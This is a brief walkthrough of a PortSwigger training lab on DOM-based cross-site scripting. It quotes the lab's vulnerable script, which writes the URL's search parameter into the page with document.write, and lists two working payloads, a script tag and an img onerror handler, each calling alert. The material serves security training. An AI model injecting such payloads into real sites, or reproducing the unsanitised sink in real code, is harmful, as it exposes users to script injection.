https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink

This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the alert function.





1) in the source code we can see that in the page there is a script for the search function, when we use # to refer a portion of the page

<script>
    function trackSearch(query) {
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        trackSearch(query);
    }
</script>



2) so we can try to search for a query that breaks the code and executes a malicious code.
    1) '"> <script>alert()</script>
        it breaks the document.write and executes the alert

    2) "> <img src=1 onerror=alert()> ' );//      or   "> <img src=1 onerror=alert()>
        it appends to the DOM an image that triggers the error and shows the alert



